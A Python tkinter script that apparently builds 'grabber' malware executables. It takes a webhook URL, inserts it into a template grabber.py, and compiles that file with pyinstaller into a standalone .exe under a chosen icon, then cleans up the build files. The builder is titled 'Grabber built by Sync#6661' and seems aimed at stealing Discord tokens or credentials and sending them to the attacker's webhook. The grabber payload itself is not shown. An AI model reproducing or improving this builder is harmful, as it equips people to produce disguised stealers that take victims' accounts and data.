from os import stat, terminal_size
from tkinter import *
import shutil
import os
from PIL import ImageTk
import time
from tkinter import filedialog as fd

def clear_entry(event, entry):
    entry.delete(0, END)
    entry.unbind('<Button-1>')

root = Tk()
root.resizable(False, False)
root.iconbitmap("GrabberData\\uwucord.ico")
image = ImageTk.PhotoImage(file = "GrabberData\\images.jpg")

canvas= Canvas(root ,width = 400, height = 200)
canvas.pack(expand = True, fill = BOTH)
canvas.create_image(0, 0, image=image, anchor="nw")

root.title(
    "Grabber built by Sync#6661"
)

webhookBox = Entry(
    root,
    width = 50
)

webhookBox.pack()
placeholder = "                                     Webhook Link"
webhookBox.insert(0, placeholder)
webhookBox.bind("<Button-1>", lambda event: clear_entry(event, webhookBox))

namebox = Entry(
    root,
    width = 20,
)
namebox.pack()
placeholder2 = "       Grabber Name"
namebox.insert(0, placeholder2)
namebox.bind("<Button-1>", lambda event: clear_entry(event, namebox))

def select_file():
    filetypes = (
        ('Icons', '*.ico'),
        ('All files', '*.*')
    )

    icon = fd.askopenfilename(filetypes = filetypes)
    path = os.path.abspath(icon)
    return path


iconpath = Button(
    root,
    width = 15,
    text = "Select an Icon",
    command = select_file
)

namebox.place(
    rely = 0.2,
    relx = 0.4
)

iconpath.place(
    relx = 0.4,
    rely = 0.3
)

webhookBox.place(
    relx = 0.2,
    rely = 0.4
)

root.geometry(
    '500x350'
)

def compileC():
    webhook = webhookBox.get()
    name = namebox.get()
    path = select_file()
    print(f'Webhook link: {webhook},\nName: {name},\nIcon Path: {path}')

    grabbersrc = r'resources\\grabber.py'
    newinstance = fr'resources\\{name}.py'
    shutil.copyfile(grabbersrc, newinstance)

    with open(f"resources\\grabber.py", "rt") as fin:
        with open(f"resources\\{name}.py", "wt") as fout:
            for line in fin:
                fout.write(line.replace("WEBHOOK = 'WEBHOOKHERE'", f"WEBHOOK = '{webhook}'"))

    time.sleep(1)

    cmdLine_noIcon = f"pyinstaller -F resources\\{name}.py"
    cmdline_withIcon = f"pyinstaller -F --i {path} resources\\{name}.py"

    if str(iconpath).endswith(".ico"):
        path = cmdline_withIcon
    else:
        path = cmdLine_noIcon

    os.system(path)

    time.sleep(10)
    os.remove(f'resources\\{name}.py')
    os.remove(f'{name}.spec')
    shutil.rmtree('build')
    time.sleep(3)

    dist_file = f"dist\\{name}.exe"
    newfolder = f"GrabberOut"
    shutil.move(dist_file, newfolder)
    shutil.rmtree("dist")

compile = Button(
    root,
    text="Create grabber!",
    command=compileC
)

compile.place(
    relx=0.4,
    rely=0.6,
)


root.mainloop()